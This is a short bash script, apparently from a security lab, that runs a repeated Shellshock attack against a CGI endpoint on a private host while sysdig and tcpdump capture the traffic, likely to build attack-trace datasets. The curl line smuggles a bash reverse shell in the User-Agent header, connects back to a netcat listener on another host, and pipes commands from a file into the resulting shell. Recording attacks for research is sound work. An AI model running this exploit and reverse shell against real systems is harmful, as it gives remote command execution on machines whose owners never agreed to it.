#!/bin/bash


for i in $(eval echo {$1..$2})
do
ssh -i ./server.pem softseclab@10.176.147.83  sudo sysdig_cap -w stream-$i.scap -z -s 4096 container.name=target and proc.name!=criu and proc.name!=init and proc.name!=systemd-udevd and proc.name!=upstart-udev-br and proc.name!=upstart-socket- and proc.name!=upstart-file-br &


ssh -i ./server.pem softseclab@10.176.147.83 sudo nohup tcpdump_cap -i eth0 -s0 -w stream-$i.cap port not 22 and port not 3490 and port not 3492 and port not 3790 and port not 80 >pdump.out &
sleep 5
tail -f fifo1 | nc -l 8000 &
curl -k -A "() { :; };/bin/bash -i >& /dev/tcp/10.176.148.53/8000 0>&1" https://10.176.147.83/cgi-bin/ss &
cat test2 > fifo1
sleep 15 


ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT sysdig_cap
ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT tcpdump_cap
sudo killall -s SIGINT nc

sudo killall -9 tail




sleep 4
done


